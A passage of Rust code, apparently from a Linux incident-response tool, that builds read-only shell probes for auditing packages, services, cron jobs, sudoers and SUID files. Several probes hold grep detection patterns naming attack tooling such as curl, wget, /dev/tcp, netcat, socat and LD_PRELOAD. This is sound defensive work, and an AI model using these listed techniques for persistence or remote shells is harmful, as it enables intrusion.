        (ArtifactIdentity::Package { name, .. }, ArtifactInvestigationAction::Package(action)) => {
            package_investigation_command(name, action)
        }
        (
            ArtifactIdentity::KernelModule { name, .. },
            ArtifactInvestigationAction::KernelModule(action),
        ) => kernel_module_investigation_command(name, action),
        (
            ArtifactIdentity::Environment { name, .. },
            ArtifactInvestigationAction::Environment(action),
        ) => environment_investigation_command(name, action),
        (ArtifactIdentity::Startup { unit, .. }, ArtifactInvestigationAction::Startup(action)) => {
            startup_investigation_command(unit, action)
        }
        (
            ArtifactIdentity::Cron {
                username,
                schedule,
                command,
                source,
                ..
            },
            ArtifactInvestigationAction::Cron(action),
        ) => cron_investigation_command(username, schedule, command, source, action),
        (
            ArtifactIdentity::Timer { timer, trigger, .. },
            ArtifactInvestigationAction::Timer(action),
        ) => timer_investigation_command(timer, trigger, action),
        (
            ArtifactIdentity::ShellConfig { path, line, .. },
            ArtifactInvestigationAction::ShellConfig(action),
        ) => shell_config_investigation_command(path, *line, action),
        (
            ArtifactIdentity::Sudoers {
                principal,
                username,
                source,
                ..
            },
            ArtifactInvestigationAction::Sudoers(action),
        ) => sudoers_investigation_command(principal, username.as_deref(), source, action),
        (
            ArtifactIdentity::SuidFile { path, .. },
            ArtifactInvestigationAction::SuidFile(action),
        ) => suid_file_investigation_command(path, action),
        (
            ArtifactIdentity::SshKey {
                username,
                key_type,
                key_content,
                path,
                ..
            },
            ArtifactInvestigationAction::SshKey(action),
        ) => ssh_key_investigation_command(username, key_type, key_content, path, action),
        _ => Err(CoreError::validation(
            "system artifact investigation",
            "the action and artifact identity do not belong to the same inventory",
        )),
    }
}

fn package_investigation_command(
    name: &str,
    action: PackageInvestigationAction,
) -> CoreResult<String> {
    if !is_valid_package_name(name) {
        return Err(invalid_detail_key("package name"));
    }
    let probe = match action {
        PackageInvestigationAction::Details => {
            "if dpkg-query -W \"$p\" >/dev/null 2>&1; then dpkg-query -s \"$p\" 2>/dev/null; elif rpm -q \"$p\" >/dev/null 2>&1; then rpm -qi \"$p\" 2>/dev/null; else printf 'Package is not installed\\n'; fi"
        }
        PackageInvestigationAction::Files => {
            "if dpkg-query -W \"$p\" >/dev/null 2>&1; then dpkg -L \"$p\" 2>/dev/null | head -n 500; elif rpm -q \"$p\" >/dev/null 2>&1; then rpm -ql \"$p\" 2>/dev/null | head -n 500; else printf 'Package is not installed\\n'; fi"
        }
        PackageInvestigationAction::Dependencies => {
            "if dpkg-query -W \"$p\" >/dev/null 2>&1; then dpkg-query -W -f='Depends\\t${Depends}\\nPre-Depends\\t${Pre-Depends}\\nRecommends\\t${Recommends}\\n' \"$p\" 2>/dev/null; elif rpm -q \"$p\" >/dev/null 2>&1; then rpm -qR \"$p\" 2>/dev/null | head -n 500; else printf 'Package is not installed\\n'; fi"
        }
        PackageInvestigationAction::Changelog => {
            "if rpm -q \"$p\" >/dev/null 2>&1; then rpm -q --changelog \"$p\" 2>/dev/null | head -n 300; else base=${p%%:*}; found=0; for f in /usr/share/doc/\"$base\"/changelog.Debian.gz /usr/share/doc/\"$base\"/changelog.gz /usr/share/doc/\"$base\"/changelog.Debian /usr/share/doc/\"$base\"/changelog; do [ -r \"$f\" ] || continue; found=1; printf '%s\\n' \"--- $f ---\"; case \"$f\" in *.gz) gzip -cd -- \"$f\" 2>/dev/null | head -n 300;; *) head -n 300 -- \"$f\" 2>/dev/null;; esac; break; done; [ \"$found\" -eq 1 ] || printf 'No local changelog is available\\n'; fi"
        }
        PackageInvestigationAction::Integrity => {
            "if dpkg-query -W \"$p\" >/dev/null 2>&1; then out=$(dpkg --verify \"$p\" 2>/dev/null | head -n 500); [ -n \"$out\" ] && printf '%s\\n' \"$out\" || printf 'No dpkg verification mismatch reported\\n'; elif rpm -q \"$p\" >/dev/null 2>&1; then out=$(rpm -V \"$p\" 2>/dev/null | head -n 500); [ -n \"$out\" ] && printf '%s\\n' \"$out\" || printf 'No RPM verification mismatch reported\\n'; else printf 'Package is not installed\\n'; fi"
        }
        PackageInvestigationAction::ConfigFiles => {
            "if dpkg-query -W \"$p\" >/dev/null 2>&1; then printf '%s\\n' 'Declared conffiles'; dpkg-query -W -f='${Conffiles}\\n' \"$p\" 2>/dev/null; if command -v debsums >/dev/null 2>&1; then printf '%s\\n' 'Changed conffiles'; debsums -ac \"$p\" 2>/dev/null | head -n 300; fi; elif rpm -q \"$p\" >/dev/null 2>&1; then rpm -V --configfiles \"$p\" 2>/dev/null | head -n 300; else printf 'Package is not installed\\n'; fi"
        }
        PackageInvestigationAction::RelatedServices => {
            "if command -v systemctl >/dev/null 2>&1; then systemctl list-unit-files --type=service --no-legend --no-pager 2>/dev/null | grep -Fi -- \"$p\" | head -n 100 || true; systemctl list-units --all --type=service --no-legend --no-pager 2>/dev/null | grep -Fi -- \"$p\" | head -n 100 || true; else printf 'systemd is unavailable\\n'; fi"
        }
        PackageInvestigationAction::RemovalPreview => {
            "printf 'Simulation only; no package mutation is dispatched\\n'; if dpkg-query -W \"$p\" >/dev/null 2>&1 && command -v apt-get >/dev/null 2>&1; then apt-get -s remove \"$p\" 2>/dev/null | head -n 500 || true; elif rpm -q \"$p\" >/dev/null 2>&1; then rpm -e --test \"$p\" 2>&1 | head -n 500 || true; else printf 'No supported local package simulation is available\\n'; fi"
        }
    };
    Ok(format!("p={}; {probe}; :", shq(name)))
}

fn kernel_module_investigation_command(
    name: &str,
    action: KernelModuleInvestigationAction,
) -> CoreResult<String> {
    if !is_valid_module_name(name) {
        return Err(invalid_detail_key("kernel module name"));
    }
    let probe = match action {
        KernelModuleInvestigationAction::Info => {
            "modinfo \"$m\" 2>/dev/null || printf 'Module metadata is unavailable\\n'"
        }
        KernelModuleInvestigationAction::Dependencies => {
            "printf 'Declared dependencies\\n'; modinfo -F depends \"$m\" 2>/dev/null || true; printf '\\nLoaded row and holders\\n'; grep -F -w -- \"$m\" /proc/modules 2>/dev/null || true; for h in /sys/module/\"$m\"/holders/*; do [ -e \"$h\" ] || continue; basename -- \"$h\"; done"
        }
        KernelModuleInvestigationAction::Parameters => {
            "printf 'Declared parameters\\n'; modinfo -p \"$m\" 2>/dev/null || true; printf '\\nRuntime parameters\\n'; for f in /sys/module/\"$m\"/parameters/*; do [ -f \"$f\" ] || continue; printf '%s\\t' \"$(basename -- \"$f\")\"; head -c 4096 -- \"$f\" 2>/dev/null; printf '\\n'; done"
        }
        KernelModuleInvestigationAction::Path => {
            "path=$(modinfo -n \"$m\" 2>/dev/null); case \"$path\" in /*) printf 'Path\\t%s\\n' \"$path\"; stat -c 'Mode\\t%A (%a)%nOwner\\t%U (%u)%nSize\\t%s%nModified\\t%y' -- \"$path\" 2>/dev/null;; *) printf 'Module path is unavailable\\n';; esac"
        }
        KernelModuleInvestigationAction::Signing => {
            "printf 'Signature ID\\t'; modinfo -F sig_id \"$m\" 2>/dev/null; printf 'Signer\\t'; modinfo -F signer \"$m\" 2>/dev/null; printf 'Key ID\\t'; modinfo -F sig_key \"$m\" 2>/dev/null; printf 'Hash algorithm\\t'; modinfo -F sig_hashalgo \"$m\" 2>/dev/null"
        }
        KernelModuleInvestigationAction::Taint => {
            "printf 'Kernel taint value\\t'; cat /proc/sys/kernel/tainted 2>/dev/null || printf 'unavailable\\n'; printf 'Module taint\\t'; cat /sys/module/\"$m\"/taint 2>/dev/null || printf 'none or unavailable\\n'; printf 'Interpretation\\t0 means the kernel reports no taint bits\\n'"
        }
        KernelModuleInvestigationAction::Hash => {
            "path=$(modinfo -n \"$m\" 2>/dev/null); case \"$path\" in /*) printf 'Path\\t%s\\n' \"$path\"; md5sum -- \"$path\" 2>/dev/null | sed 's/^/MD5\\t/'; sha256sum -- \"$path\" 2>/dev/null | sed 's/^/SHA256\\t/';; *) printf 'Module path is unavailable\\n';; esac"
        }
        KernelModuleInvestigationAction::Dmesg => {
            "dmesg 2>/dev/null | grep -Fi -- \"$m\" | tail -n 100 || true"
        }
    };
    Ok(format!("m={}; {probe}; :", shq(name)))
}

fn environment_investigation_command(
    name: &str,
    action: EnvVarInvestigationAction,
) -> CoreResult<String> {
    if !is_valid_environment_name(name) {
        return Err(invalid_detail_key("environment variable name"));
    }
    if action == EnvVarInvestigationAction::PathDirectories && name != "PATH" {
        return Err(CoreError::validation(
            "environment investigation",
            "PATH directory inspection is only valid for the PATH variable",
        ));
    }
    let probe = match action {
        EnvVarInvestigationAction::TraceSource => {
            "for f in /etc/environment /etc/profile /etc/bash.bashrc /etc/bashrc /etc/profile.d/* \"$HOME/.profile\" \"$HOME/.bash_profile\" \"$HOME/.bashrc\"; do [ -f \"$f\" ] || continue; grep -Fn -- \"$n\" \"$f\" 2>/dev/null | head -n 50 | while IFS= read -r line; do printf '%s:%s\\n' \"$f\" \"$line\"; done; done"
        }
        EnvVarInvestigationAction::LdPreload => {
            "printf 'Current process environment\\n'; env 2>/dev/null | grep -E '^LD_(PRELOAD|LIBRARY_PATH)=' || printf 'No LD preload variables are set\\n'; printf '\\n/etc/ld.so.preload\\n'; if [ -r /etc/ld.so.preload ]; then sed -n '1,100p' /etc/ld.so.preload; else printf 'File is absent or unreadable\\n'; fi"
        }
        EnvVarInvestigationAction::PathDirectories => {
            "printf '%s' \"$PATH\" | tr ':' '\\n' | while IFS= read -r d; do if [ -z \"$d\" ]; then printf '<empty entry>\\tcurrent directory\\n'; continue; fi; printf '%s\\t' \"$d\"; stat -c '%A (%a) %U:%G' -- \"$d\" 2>/dev/null || printf 'missing or unreadable\\n'; done"
        }
        EnvVarInvestigationAction::ProcessOwners => {
            "count=0; for d in /proc/[0-9]*; do [ -r \"$d/environ\" ] || continue; line=$(tr '\\0' '\\n' < \"$d/environ\" 2>/dev/null | awk -v key=\"$n=\" 'index($0,key)==1 {print; exit}'); [ -n \"$line\" ] || continue; uid=$(stat -c '%u' -- \"$d\" 2>/dev/null); user=$(getent passwd \"$uid\" 2>/dev/null | cut -d: -f1); printf '%s\\t%s\\t%s\\n' \"${user:-$uid}\" \"${d##*/}\" \"$line\"; count=$((count+1)); [ \"$count\" -ge 100 ] && break; done; [ \"$count\" -gt 0 ] || printf 'No readable process environment contains this variable\\n'"
        }
    };
    Ok(format!("n={}; {probe}; :", shq(name)))
}

fn startup_investigation_command(
    unit: &str,
    action: StartupInvestigationAction,
) -> CoreResult<String> {
    if !is_valid_service_unit(unit) {
        return Err(invalid_detail_key("systemd startup service"));
    }
    let probe = match action {
        StartupInvestigationAction::Details => {
            "systemctl show \"$u\" --no-pager -p Id -p Description -p LoadState -p ActiveState -p SubState -p UnitFileState -p FragmentPath -p DropInPaths -p ExecStart 2>/dev/null"
        }
        StartupInvestigationAction::Command => {
            "printf 'ExecStart\\n'; systemctl show \"$u\" --no-pager -p ExecStart --value 2>/dev/null; printf '\\nExecStartPre\\n'; systemctl show \"$u\" --no-pager -p ExecStartPre --value 2>/dev/null; printf '\\nExecStartPost\\n'; systemctl show \"$u\" --no-pager -p ExecStartPost --value 2>/dev/null"
        }
        StartupInvestigationAction::UnitFile | StartupInvestigationAction::ViewConfig => {
            "systemctl cat \"$u\" --no-pager 2>/dev/null || printf 'Unit configuration is unavailable\\n'"
        }
        StartupInvestigationAction::StartupType => {
            "printf 'Enabled state\\t'; systemctl is-enabled \"$u\" 2>/dev/null || true; printf 'Preset\\t'; systemctl show \"$u\" -p Preset --value 2>/dev/null; printf 'WantedBy\\t'; systemctl show \"$u\" -p WantedBy --value 2>/dev/null; printf 'RequiredBy\\t'; systemctl show \"$u\" -p RequiredBy --value 2>/dev/null; printf 'Default target\\t'; systemctl get-default 2>/dev/null || true"
        }
        StartupInvestigationAction::ConfigLocation => {
            "systemctl show \"$u\" --no-pager -p FragmentPath -p SourcePath -p DropInPaths 2>/dev/null"
        }
        StartupInvestigationAction::SuspiciousPath => {
            "execs=$(systemctl show \"$u\" -p ExecStart --value 2>/dev/null); printf 'ExecStart\\t%s\\n' \"$execs\"; printf '%s\\n' \"$execs\" | grep -E '(/tmp/|/var/tmp/|/dev/shm/|/home/|curl[[:space:]]|wget[[:space:]]|nc[[:space:]]|ncat[[:space:]]|bash[[:space:]]+-c|sh[[:space:]]+-c)' || printf 'No high-signal suspicious path token matched\\n'; path=$(systemctl show \"$u\" -p FragmentPath --value 2>/dev/null); case \"$path\" in /*) stat -c 'Unit file\\t%n%nMode\\t%A (%a)%nOwner\\t%U:%G' -- \"$path\" 2>/dev/null;; esac"
        }
        StartupInvestigationAction::FileSignature => {
            "path=$(systemctl show \"$u\" -p FragmentPath --value 2>/dev/null); case \"$path\" in /*) printf 'Path\\t%s\\n' \"$path\"; sha256sum -- \"$path\" 2>/dev/null | awk '{print \"SHA256\\t\"$1}'; file -b -- \"$path\" 2>/dev/null | sed 's/^/Type\\t/';; *) printf 'Unit file path is unavailable\\n';; esac"
        }
        StartupInvestigationAction::ModificationTime => {
            "systemctl show \"$u\" -p FragmentPath -p DropInPaths --value 2>/dev/null | tr ' ' '\\n' | while IFS= read -r p; do case \"$p\" in /*) stat -c '%n\\t%y\\t%A\\t%U:%G' -- \"$p\" 2>/dev/null;; esac; done"
        }
        StartupInvestigationAction::MalwareIndicators => {
            "cfg=$(systemctl cat \"$u\" --no-pager 2>/dev/null); printf '%s\\n' \"$cfg\" | grep -Ein '(curl|wget|/dev/tcp|base64[[:space:]]+-d|LD_PRELOAD|/tmp/|/dev/shm/|nc[[:space:]]|ncat[[:space:]]|socat|python[^[:space:]]*[[:space:]]+-c|perl[[:space:]]+-e)' | head -n 100 || printf 'No high-signal malicious token matched\\n'"
        }
        StartupInvestigationAction::Dependencies => {
            "systemctl list-dependencies \"$u\" --all --no-pager 2>/dev/null | head -n 300; printf '\\nReverse dependencies\\n'; systemctl list-dependencies \"$u\" --reverse --all --no-pager 2>/dev/null | head -n 300"
        }
        StartupInvestigationAction::BootOrder => {
            "systemctl show \"$u\" --no-pager -p After -p Before -p Wants -p Requires -p WantedBy -p RequiredBy 2>/dev/null"
        }
        StartupInvestigationAction::BootTime => {
            "if command -v systemd-analyze >/dev/null 2>&1; then systemd-analyze blame --no-pager 2>/dev/null | grep -F -- \"$u\" | head -n 20 || printf 'Unit has no retained boot timing row\\n'; else printf 'systemd-analyze is unavailable\\n'; fi"
        }
        StartupInvestigationAction::ResourceUsage => {
            "systemctl show \"$u\" --no-pager -p ActiveState -p SubState -p MainPID -p TasksCurrent -p MemoryCurrent -p CPUUsageNSec -p IOReadBytes -p IOWriteBytes -p NRestarts 2>/dev/null"
        }
        StartupInvestigationAction::StartupLogs => {
            "journalctl -u \"$u\" -b --no-pager -n 200 2>/dev/null || printf 'No boot log is available\\n'"
        }
        StartupInvestigationAction::ErrorLogs => {
            "journalctl -u \"$u\" -p err --no-pager -n 200 2>/dev/null || printf 'No retained error log is available\\n'"
        }
        StartupInvestigationAction::RunHistory => {
            "journalctl -u \"$u\" --no-pager -n 500 2>/dev/null | grep -E '(Started|Starting|Stopped|Stopping|Failed|failure|Main process exited)' | tail -n 200 || printf 'No retained lifecycle event is available\\n'"
        }
        StartupInvestigationAction::ConfigSummary => {
            "printf 'Identity and state\\n'; systemctl show \"$u\" --no-pager -p Id -p Description -p ActiveState -p SubState -p UnitFileState -p FragmentPath -p DropInPaths -p ExecStart 2>/dev/null; printf '\\nEffective unit file\\n'; systemctl cat \"$u\" --no-pager 2>/dev/null | head -n 300"
        }
    };
    Ok(format!("u={}; {probe}; :", shq(unit)))
}

fn cron_investigation_command(
    username: &str,
    schedule: &str,
    command: &str,
    source: &str,
    action: CronInvestigationAction,
) -> CoreResult<String> {
    if !is_valid_username(username) {
        return Err(invalid_detail_key("cron username"));
    }
    let schedule = validated_cron_schedule(schedule)?;
    let command = validated_inert_command(command)?;
    let source = validated_cron_source(source)?;
    let probe = match action {
        CronInvestigationAction::ViewSource => {
            "nl -ba -- \"$src\" 2>/dev/null | head -n 1000 || printf 'Cron source is unreadable\\n'"
        }
        CronInvestigationAction::Details => {
            "printf 'User\\t%s\\nSchedule\\t%s\\nCommand\\t%s\\nSource\\t%s\\n' \"$user\" \"$sched\" \"$cmd\" \"$src\"; stat -c 'Owner\\t%U:%G%nMode\\t%A (%a)%nModified\\t%y%nSize\\t%s' -- \"$src\" 2>/dev/null"
        }
        CronInvestigationAction::Schedule => {
            "printf 'Cron schedule\\t%s\\nTarget timezone\\t%s\\nTarget time\\t%s\\n' \"$sched\" \"$(date +%Z 2>/dev/null)\" \"$(date --iso-8601=seconds 2>/dev/null)\""
        }
        CronInvestigationAction::Command => {
            "printf 'Command is displayed as inert text and is not executed.\\n%s\\n' \"$cmd\""
        }
        CronInvestigationAction::ViewCrontab => {
            "grep -FnF -- \"$cmd\" \"$src\" 2>/dev/null | head -n 100 || printf 'Exact command text is no longer present in the source file\\n'"
        }
        CronInvestigationAction::ExecutionLogs => {
            "for f in /var/log/cron /var/log/cron.log /var/log/syslog /var/log/messages; do [ -r \"$f\" ] || continue; grep -F -- \"$user\" \"$f\" 2>/dev/null | grep -F -- \"$cmd\" | tail -n 100; done"
        }
        CronInvestigationAction::RecentRuns => {
            "journalctl -t CRON -t CROND -u cron -u crond --no-pager -n 1000 2>/dev/null | grep -F -- \"$user\" | tail -n 100 || true"
        }
        CronInvestigationAction::ErrorLogs => {
            "journalctl -t CRON -t CROND -u cron -u crond -p err --no-pager -n 300 2>/dev/null | grep -F -- \"$user\" | tail -n 100 || true"
        }
        CronInvestigationAction::ParseSchedule => {
            "printf '%s\\n' \"$sched\" | awk '{printf \"Minute\\t%s\\nHour\\t%s\\nDay of month\\t%s\\nMonth\\t%s\\nDay of week\\t%s\\n\",$1,$2,$3,$4,$5}'"
        }
        CronInvestigationAction::NextRun => {
            r#"if printf '%s' "$sched" | grep -q '[A-Za-z]'; then printf 'Named month or weekday schedules are not evaluated locally; expression remains read-only: %s\n' "$sched"; else awk -v spec="$sched" '
function field(v,s,min,max, n,parts,i,pair,base,step,bounds,lo,hi) {
    n=split(s,parts,",");
    for (i=1;i<=n;i++) {
        base=parts[i]; step=1;
        if (index(base,"/")) { split(base,pair,"/"); base=pair[1]; step=pair[2]+0; }
        if (step<1) continue;
        if (base=="*") { lo=min; hi=max; }
        else if (index(base,"-")) { split(base,bounds,"-"); lo=bounds[1]+0; hi=bounds[2]+0; }
        else { lo=base+0; hi=lo; }
        if (lo<min || hi>max || lo>hi) continue;
        if (v>=lo && v<=hi && ((v-lo)%step)==0) return 1;
    }
    return 0;
}
BEGIN {
    split(spec,f," "); start=systime(); start=start-(start%60)+60;
    dom_star=(f[3]=="*"); dow_star=(f[5]=="*");
    for (i=0;i<527040;i++) {
        t=start+i*60; minute=strftime("%M",t)+0; hour=strftime("%H",t)+0;
        dom=strftime("%d",t)+0; month=strftime("%m",t)+0; dow=strftime("%w",t)+0;
        dom_hit=field(dom,f[3],1,31); dow_hit=field(dow,f[5],0,7) || (dow==0 && field(7,f[5],0,7));
        day_hit=(dom_star || dow_star) ? (dom_hit && dow_hit) : (dom_hit || dow_hit);
        if (field(minute,f[1],0,59) && field(hour,f[2],0,23) && day_hit && field(month,f[4],1,12)) {
            printf "Next numeric match\t%s\n", strftime("%Y-%m-%d %H:%M:%S %Z",t); exit;
        }
    }
    print "No numeric match was found within 366 days";
}' /dev/null; fi"#
        }
        CronInvestigationAction::Frequency => {
            r#"awk -v s="$sched" 'BEGIN {split(s,f," "); printf "Expression\t%s\n",s; if (s=="* * * * *") print "Frequency\tEvery minute"; else if (f[1] ~ /^\*\/[0-9]+$/ && f[2]=="*") print "Frequency\tMinute interval within every hour"; else if (f[1] !~ /[*,-\/]/ && f[2]=="*") print "Frequency\tOnce per hour"; else if (f[1] !~ /[*,-\/]/ && f[2] !~ /[*,-\/]/ && f[3]=="*" && f[4]=="*" && f[5]=="*") print "Frequency\tOnce per day"; else print "Frequency\tCompound cron schedule; use the next-match preview"}'"#
        }
        CronInvestigationAction::SecurityCheck => {
            "printf 'Command is not executed. High-signal tokens:\\n'; printf '%s\\n' \"$cmd\" | grep -Ein '(curl|wget|/dev/tcp|base64[[:space:]]+-d|chmod[[:space:]]+[+]?[su]|chattr|LD_PRELOAD|/tmp/|/dev/shm/|nc[[:space:]]|ncat[[:space:]]|socat|python[^[:space:]]*[[:space:]]+-c|perl[[:space:]]+-e|rm[[:space:]]+-rf)' || printf 'No high-signal token matched\\n'"
        }
        CronInvestigationAction::PathCheck => {
            "first=$(printf '%s\\n' \"$cmd\" | awk '{for(i=1;i<=NF;i++){if($i ~ /^[A-Za-z_][A-Za-z0-9_]*=/) continue; if($i==\"sudo\" || $i==\"env\") continue; print $i; exit}}'); printf 'First executable token\\t%s\\n' \"$first\"; case \"$first\" in /*) path=\"$first\";; -*|'') path='';; *) path=$(command -v \"$first\" 2>/dev/null || true);; esac; case \"$path\" in /*) stat -c 'Resolved path\\t%n%nMode\\t%A (%a)%nOwner\\t%U:%G%nModified\\t%y' -- \"$path\" 2>/dev/null; sha256sum -- \"$path\" 2>/dev/null | awk '{print \"SHA256\\t\"$1}';; *) printf 'Executable could not be resolved without running the task\\n';; esac"
        }
        CronInvestigationAction::SuspiciousCheck => {
            "printf 'Source file\\n'; stat -c '%n\\t%A (%a)\\t%U:%G\\t%y' -- \"$src\" 2>/dev/null; printf '\\nCommand indicators\\n'; printf '%s\\n' \"$cmd\" | grep -Ein '(/tmp/|/dev/shm/|curl|wget|base64|nohup|setsid|LD_PRELOAD|/dev/tcp|nc[[:space:]]|socat)' || printf 'No high-signal persistence token matched\\n'"
        }
        CronInvestigationAction::ExportRecord => {
            "printf 'user\\t%s\\nschedule\\t%s\\ncommand\\t%s\\nsource\\t%s\\n' \"$user\" \"$sched\" \"$cmd\" \"$src\""
        }
    };
    Ok(format!(
        "user={}; sched={}; cmd={}; src={}; {probe}; :",
        shq(username),
        shq(&schedule),
        shq(&command),
        shq(&source),
    ))
}

fn timer_investigation_command(
    timer: &str,
    trigger: &str,
    action: TimerInvestigationAction,
) -> CoreResult<String> {
    if !is_valid_timer_unit(timer) || !is_valid_unit_name(trigger) {
        return Err(invalid_detail_key("systemd timer identity"));
    }
    let probe = match action {
        TimerInvestigationAction::TimerStatus => {
            "systemctl status \"$t\" --no-pager -l 2>/dev/null || true; printf '\\nTimer properties\\n'; systemctl show \"$t\" --no-pager -p ActiveState -p SubState -p UnitFileState -p NextElapseUSecRealtime -p LastTriggerUSec -p Triggers 2>/dev/null"
        }
        TimerInvestigationAction::TimerConfig => {
            "systemctl cat \"$t\" --no-pager 2>/dev/null || printf 'Timer configuration is unavailable\\n'"
        }
        TimerInvestigationAction::UnitStatus => {
            "systemctl status \"$g\" --no-pager -l 2>/dev/null || true; systemctl show \"$g\" --no-pager -p ActiveState -p SubState -p Result -p ExecMainStatus -p FragmentPath 2>/dev/null"
        }
        TimerInvestigationAction::UnitConfig => {
            "systemctl cat \"$g\" --no-pager 2>/dev/null || printf 'Triggered unit configuration is unavailable\\n'"
        }
        TimerInvestigationAction::TimerLogs => {
            "journalctl -u \"$t\" --no-pager -n 200 2>/dev/null || printf 'No timer log is available\\n'"
        }
        TimerInvestigationAction::UnitLogs => {
            "journalctl -u \"$g\" --no-pager -n 200 2>/dev/null || printf 'No triggered-unit log is available\\n'"
        }
    };
    Ok(format!("t={}; g={}; {probe}; :", shq(timer), shq(trigger)))
}

fn shell_config_investigation_command(
    path: &str,
    line: u32,
    action: ShellConfigInvestigationAction,
) -> CoreResult<String> {
    let path = validated_shell_config_path(path)?;
    if !(1..=10_000_000).contains(&line) {
        return Err(invalid_detail_key("shell configuration line"));
    }
    let probe = match action {
        ShellConfigInvestigationAction::ViewContext => {
            "start=$((line>10 ? line-10 : 1)); end=$((line+10)); nl -ba -- \"$p\" 2>/dev/null | sed -n \"${start},${end}p\""
        }
        ShellConfigInvestigationAction::ViewFile => {
            "nl -ba -- \"$p\" 2>/dev/null | head -n 1000 || printf 'Shell configuration is unreadable\\n'"
        }
        ShellConfigInvestigationAction::Permissions => {
            "stat -c 'Path\\t%n%nOwner\\t%U (%u)%nGroup\\t%G (%g)%nMode\\t%A (%a)%nModified\\t%y%nChanged\\t%z%nSize\\t%s' -- \"$p\" 2>/dev/null; if command -v getfacl >/dev/null 2>&1; then printf '\\nACL\\n'; getfacl -p -- \"$p\" 2>/dev/null | head -n 200; fi"
        }
        ShellConfigInvestigationAction::History => {
            "stat -c 'Current file\\nPath\\t%n%nBirth\\t%w%nModified\\t%y%nChanged\\t%z%nInode\\t%i%nSize\\t%s' -- \"$p\" 2>/dev/null; dir=$(dirname -- \"$p\"); base=$(basename -- \"$p\"); printf '\\nNearby backup candidates\\n'; find \"$dir\" -maxdepth 1 -type f -name \"$base*\" -printf '%TY-%Tm-%TdT%TH:%TM:%TS\\t%m\\t%u:%g\\t%p\\n' 2>/dev/null | sort -r | head -n 100"
        }
        ShellConfigInvestigationAction::SuspiciousLines => {
            "grep -Ein '(curl|wget|/dev/tcp|base64[[:space:]]+-d|LD_PRELOAD|PROMPT_COMMAND|BASH_ENV|ENV=|/tmp/|/dev/shm/|nc[[:space:]]|ncat[[:space:]]|socat|python[^[:space:]]*[[:space:]]+-c|perl[[:space:]]+-e)' -- \"$p\" 2>/dev/null | head -n 200 || printf 'No high-signal suspicious line matched\\n'"
        }
        ShellConfigInvestigationAction::OwnerCheck => {
            "uid=$(stat -c '%u' -- \"$p\" 2>/dev/null); gid=$(stat -c '%g' -- \"$p\" 2>/dev/null); owner=$(getent passwd \"$uid\" 2>/dev/null | cut -d: -f1); group=$(getent group \"$gid\" 2>/dev/null | cut -d: -f1); printf 'UID\\t%s\\nUser\\t%s\\nGID\\t%s\\nGroup\\t%s\\n' \"$uid\" \"${owner:-unknown}\" \"$gid\" \"${group:-unknown}\"; [ -n \"$owner\" ] && id \"$owner\" 2>/dev/null || true"
        }
    };
    Ok(format!("p={}; line={line}; {probe}; :", shq(&path)))
}

fn sudoers_investigation_command(
    principal: &str,
    username: Option<&str>,
    source: &str,
    action: SudoersInvestigationAction,
) -> CoreResult<String> {
    let principal = validated_sudo_principal(principal)?;
    let source = validated_sudoers_source(source)?;
    let username = match username {
        Some(username) if is_valid_username(username) => Some(username),
        Some(_) => return Err(invalid_detail_key("sudoers username")),
        None => None,
    };
    if action.requires_username() && username.is_none() {
        return Err(CoreError::validation(
            "sudoers investigation",
            "the selected principal is not a concrete Linux username",
        ));
    }
    let probe = match action {
        SudoersInvestigationAction::ViewSudoers => {
            "nl -ba /etc/sudoers 2>/dev/null | head -n 1000 || printf '/etc/sudoers is unreadable\\n'"
        }
        SudoersInvestigationAction::ViewSource => {
            "nl -ba -- \"$src\" 2>/dev/null | head -n 1000 || printf 'Sudoers source is unreadable\\n'"
        }
        SudoersInvestigationAction::SyntaxCheck => {
            "if command -v visudo >/dev/null 2>&1; then visudo -c -f \"$src\" 2>&1 | head -n 200; else printf 'visudo is unavailable\\n'; fi"
        }
        SudoersInvestigationAction::ListDropIns => {
            "find /etc/sudoers.d -maxdepth 1 -type f -printf '%m\\t%u:%g\\t%TY-%Tm-%TdT%TH:%TM:%TS\\t%p\\n' 2>/dev/null | sort | head -n 300"
        }
        SudoersInvestigationAction::UserPermissions => {
            "if command -v sudo >/dev/null 2>&1; then sudo -n -l -U \"$user\" 2>&1 | head -n 500; else printf 'sudo is unavailable\\n'; fi"
        }
        SudoersInvestigationAction::UserHistory => {
            "for f in /var/log/auth.log /var/log/secure; do [ -r \"$f\" ] || continue; grep -F -- \"$user\" \"$f\" 2>/dev/null | grep -F 'sudo' | tail -n 100; done; journalctl _COMM=sudo --no-pager -n 1000 2>/dev/null | grep -F -- \"$user\" | tail -n 100 || true"
        }
        SudoersInvestigationAction::UserGroups => {
            "getent passwd \"$user\" 2>/dev/null || true; id \"$user\" 2>/dev/null || printf 'User no longer exists\\n'"
        }
        SudoersInvestigationAction::FindNoPassword => {
            "for f in /etc/sudoers /etc/sudoers.d/*; do [ -f \"$f\" ] || continue; grep -HnE '^[[:space:]]*[^#].*NOPASSWD' -- \"$f\" 2>/dev/null; done | head -n 500"
        }
    };
    Ok(format!(
        "principal={}; user={}; src={}; {probe}; :",
        shq(&principal),
        shq(username.unwrap_or("")),
        shq(&source),
    ))
}

fn suid_file_investigation_command(
    path: &str,
    action: SuidFileInvestigationAction,
) -> CoreResult<String> {
    let path = validated_absolute_path(path)?;
    if action == SuidFileInvestigationAction::Details {
        return Ok(file_detail_command(&path));
    }
    let probe = match action {
        SuidFileInvestigationAction::Details => unreachable!("handled above"),
        SuidFileInvestigationAction::FileType => {
            "file -L -- \"$p\" 2>/dev/null; readelf -h -- \"$p\" 2>/dev/null | head -n 80 || true"
        }
        SuidFileInvestigationAction::Hash => {
            "sha256sum -- \"$p\" 2>/dev/null | awk '{print \"SHA256\\t\"$1}'; md5sum -- \"$p\" 2>/dev/null | awk '{print \"MD5\\t\"$1}'"
        }
        SuidFileInvestigationAction::Strings => {
            "if command -v strings >/dev/null 2>&1; then strings -a -n 6 -- \"$p\" 2>/dev/null | grep -Ein '(/bin/(sh|bash)|system\\(|popen\\(|execve|setuid|setgid|/tmp/|/dev/shm/|LD_PRELOAD|curl|wget|socket|connect)' | head -n 300 || printf 'No high-signal string matched\\n'; else printf 'strings is unavailable\\n'; fi"
        }
        SuidFileInvestigationAction::Package => {
            "if command -v dpkg-query >/dev/null 2>&1; then dpkg-query -S -- \"$p\" 2>/dev/null || printf 'No dpkg owner found\\n'; elif command -v rpm >/dev/null 2>&1; then rpm -qf -- \"$p\" 2>/dev/null || printf 'No RPM owner found\\n'; else printf 'No supported package database is available\\n'; fi"
        }
        SuidFileInvestigationAction::Integrity => {
